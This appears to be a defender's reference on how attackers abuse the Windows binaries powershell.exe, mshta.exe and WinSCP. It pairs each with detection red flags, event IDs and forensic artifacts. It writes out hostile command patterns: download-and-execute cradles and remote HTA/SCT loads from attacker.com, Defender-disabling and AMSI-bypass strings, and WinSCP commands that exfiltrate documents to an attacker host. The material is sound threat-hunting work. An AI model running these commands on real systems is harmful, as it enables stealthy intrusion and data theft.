powershell.exe / pwsh.exe LOLBin

Windows scripting engine and automation framework — full attack lifecycle platform.

How it's abused
  • -EncodedCommand hides base64 payloads — most common obfuscation primitive
  • IEX + DownloadString = fileless in-memory execution, nothing touches disk
  • AMSI bypass via reflection patching (amsiInitFailed / AmsiScanBuffer patch)
  • -Version 2 downgrade bypasses AMSI entirely — v2 predates it
  • Runs PowerSploit, PowerView, Invoke-Mimikatz via download cradles
  • Disables Defender: Set-MpPreference -DisableRealtimeMonitoring $true
  • Loads .NET assemblies in memory: [Reflection.Assembly]::Load — Cobalt Strike / Empire beacon delivery
  • Registry-stored payloads: reads Base64 from reg key → IEX — no .ps1 file ever written
Malicious command patterns
powershell.exe -NoP -NonI -W Hidden -Enc <LONG_BASE64> powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://...')" powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -EncodedCommand <B64> powershell -Version 2 -Command "malicious code" # AMSI bypass via downgrade IEX (iwr 'http://attacker.com/p.ps1' -UseBasicParsing).Content [Reflection.Assembly]::Load([System.Convert]::FromBase64String('<BASE64_ASSEMBLY>'))
Suspicious parent → powershell chains
winword.exe / excel.exe / outlook.exe → powershell # macro exploitation mshta.exe → powershell # HTA stage wscript.exe / cscript.exe → powershell # VBS dropper wmiprvse.exe → powershell # WMI lateral movement chrome.exe / msedge.exe → powershell # ClickFix / ClearFake svchost.exe → powershell # suspicious service
AMSI bypass strings (look in Event ID 4104)
amsiInitFailed AmsiUtils AmsiScanBuffer VirtualProtect Marshal::Copy amsi.dll [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
Red flags
-enc with payload >200 chars -ExecutionPolicy Bypass + -W Hidden + -NonI + -NoP combo IEX + DownloadString in same command [Reflection.Assembly]::Load + Base64 blob Parent: winword / excel / mshta / wmiprvse -Version 2 flag (AMSI downgrade) amsiInitFailed in Event 4104 Outbound connection right after launch Running from %TEMP% or unusual path Accessing lsass.exe (Sysmon EID 10) ConsoleHost_history.txt cleared Rapid multiple PS processes (worm/automated)
Key event IDs
  • 4104 — Script Block Logging: deobfuscated content at execution (CRITICAL — enable this)
  • 4103 — Module Logging: pipeline details, variable values
  • Sysmon 1 — Full command line + parent + hash
  • Sysmon 3 — Network connection from powershell.exe
  • Sysmon 10 — lsass.exe access = credential dump
  • 4698/4702 — Scheduled task created/modified via PS
Forensic artifacts
  • ConsoleHost_history.txt — %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ (not cleared by Clear-History)
  • Event 4104 logs — deobfuscated script blocks persist even after script deleted
  • Prefetch — POWERSHELL.EXE-{HASH}.pf
  • SRUM DB — bytes sent by powershell.exe (exfil quantification)
  • Memory — Volatility can extract PS script blocks from RAM (fileless)
Known threat actors
  • APT28, APT29, APT32, APT41, Sandworm, HAFNIUM
  • FIN7, Wizard Spider, Cobalt Group
  • Black Basta, Akira, LockBit, Emotet, TrickBot, QakBot
  • Lumma Stealer, CoralRaider (ClickFix/ClearFake chains)
MITRE: T1059.001 Critical

mshta.exe LOLBin

Microsoft HTML Application Host — executes .hta files using Trident engine. Ranked #2 in Red Canary's 2024 threat detection report — surged due to ClearFake/ClickFix campaigns.

How it's abused
  • Executes remote HTA files with VBScript/JScript — bypasses AppLocker (signed MS binary)
  • Spawned by Office macros to proxy execution and avoid direct PowerShell detection
  • ClearFake/ClickFix (2024): fake CAPTCHA on compromised site copies mshta command to clipboard → user pastes into Win+R Run dialog → no email, no file, no AV scan
  • Inline vbscript: moniker — runs PowerShell entirely in-line, nothing touches disk
  • WMI-broken chain evasion: malware uses WMI to spawn processes from mshta.exe making wmiprvse.exe appear as parent, breaking parent-child detection rules
  • Registry-embedded payload execution via vbscript: → RegRead → Execute
Malicious command patterns
mshta.exe http://attacker.com/payload.hta mshta.exe https://185.220.x.x/stage2.hta # Inline VBScript — runs PS without touching disk mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""powershell -ExecutionPolicy Bypass -W Hidden -File C:\Users\Public\s.ps1"",0")) # Inline scriptlet from remote SCT file mshta.exe vbscript:Close(Execute("GetObject(""script:https://attacker.com/p.sct"")")) # ClearFake/ClickFix pattern (2024 surge) mshta xxxx[.]co/xxxxxx=+\xxx # HTA from user-writable path (post-phishing) mshta.exe C:\Users\Public\Downloads\invoice.hta
Suspicious parent → mshta chains
winword.exe / excel.exe / outlook.exe → mshta # macro exploitation wscript.exe / cscript.exe → mshta # VBS dropper explorer.exe → mshta # ClickFix / Run dialog lure chrome.exe / msedge.exe → mshta # malvertising / drive-by
Suspicious mshta → child chains
mshta → powershell mshta → cmd mshta → wscript mshta → rundll32 mshta → certutil mshta → regsvr32 mshta → bitsadmin mshta → schtasks mshta → reg.exe
Red flags
URL / HTTP in arguments vbscript: or javascript: moniker Parent: winword / excel / outlook / browser Spawning powershell / cmd / wscript Outbound connection (Sysmon EID 3) .hta file in %TEMP% / %APPDATA% / Downloads Renamed mshta.exe — check OriginalFileName (Sysmon EID 1) scrobj.dll / jscript.dll / vbscript.dll loaded (Sysmon EID 7) Explorer parent = ClickFix / Run dialog lure Touching Run/RunOnce keys (Sysmon EID 13) Creating files in temp directories (Sysmon EID 11) Base64 strings or obfuscated chars in command line User report of website asking to open Run and paste a command
Key event IDs
  • Sysmon 1 — Full command line, parent, OriginalFileName (catches renamed binary)
  • Sysmon 3 — Network connection from mshta.exe
  • Sysmon 7 — DLL load: jscript.dll / vbscript.dll / scrobj.dll in mshta
  • Sysmon 11 — File created by mshta.exe
  • Sysmon 13 — Registry set — mshta touching Run keys
  • Sysmon 22 — DNS query from mshta.exe
Forensic artifacts
  • .hta files in %TEMP%, %APPDATA%, Downloads, Desktop
  • Prefetch — MSHTA.EXE-{HASH}.pf (proves execution + files accessed)
  • AmCache — first execution timestamp
  • Browser history / download logs if .hta was downloaded
  • Registry Run/RunOnce keys if persistence was set
  • Scheduled task XML in C:\Windows\System32\Tasks\
Known threat actors
  • APT29, APT32, APT36, APT38, APT41, Kimsuky, Lazarus
  • FIN7, Gamaredon, MuddyWater, TA551
  • Lumma Stealer, AsyncRAT, XWorm, NetSupport RAT (ClearFake chain)
  • Koadic C2, Covenant C2 (HTA-based stagers)

  • Portable version (WinSCP-Portable.zip) — no install, no registry, dropped to %TEMP% and wiped after use
Malicious command patterns
# Headless scripted SFTP exfil (no GUI window) winscp.exe /script=C:\Users\Public\exfil.txt # Inline command — no script file on disk winscp.exe /command "open sftp://user:password@attacker.com/" "put C:\Users\*\Documents\*.docx /upload/" "exit" # /ini=nul — no registry entries written (HIGH CONFIDENCE MALICIOUS) winscp.exe /ini=nul /script=exfil.txt # Hostkey bypass — non-interactive, accepts any SSH key winscp.exe /command "open sftp://user:pass@1.2.3.4 -hostkey=""*""" "synchronize remote C:\CriticalData /upload" "exit" # Silent install (attacker-deployed) winscp.exe /VERYSILENT /NORESTART
Red flags
WinSCP on server / DC (no business use) /script= or /command= flags /ini=nul flag = evidence destruction Executed by SYSTEM / service account Spawned by cmd / PowerShell / scheduled task Outbound port 22 (SFTP) to external IP WinSCP + AnyDesk on same host WinSCP.ini in %TEMP% / C:\Users\Public Preceded by 7-Zip / WinRAR staging activity Portable ZIP extracted to %TEMP% Large bytes-sent in SRUM DB for winscp.exe Registry: History\RemoteTarget = unknown external IP
Registry forensic keys
# Remote destinations — WHERE data went (gold for IR) HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\History\RemoteTarget # Local paths data was taken FROM HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Interface\Commander\LocalPanel\LastPath # SSH fingerprints of external hosts accepted HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\LastFingerprints # Saved sessions (hostname, username, protocol, paths) HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions\ # NOTE: /ini=nul = none of the above will be populated
Forensic artifacts
  • WinSCP.ini — same dir as winscp.exe; sessions, usernames, last paths, connected hosts
  • SRUM DB — C:\Windows\System32\sru\SRUDB.dat — bytes sent/received per hour by winscp.exe — CRITICAL for quantifying exfil volume
  • Prefetch — WINSCP.EXE-{HASH}.pf — execution evidence + referenced files
  • Portable temp — %LOCALAPPDATA%\Temp\Temp*_WinSCP--Portable.zip
  • AmCache / Shimcache — first/last execution timestamps
Known threat actors
  • BlackCat/ALPHV, Black Basta, LockBit 3.0, Akira, Medusa, BlackSuit
  • Agenda/Qilin ransomware, Gentlemen ransomware
  • Often paired with: Rclone, PuTTY/plink, 7-Zip, cURL, AnyDesk
